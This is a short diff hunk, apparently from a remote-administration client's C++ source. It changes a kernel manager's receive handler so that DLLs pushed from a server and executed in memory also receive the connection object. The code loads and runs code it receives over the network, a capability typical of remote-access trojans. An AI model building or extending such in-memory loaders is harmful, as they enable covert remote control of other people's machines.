@@ -202,7 +202,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		if (ulLength <= sz)break;
 		DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
 		if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
-			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit);
+			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
 			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, szBuffer + sz), 0, NULL));
 			Mprintf("Execute '%s'%d succeed: %d Length: %d\n", info->Name, info->CallType, szBuffer[1], info->Size);
 		}
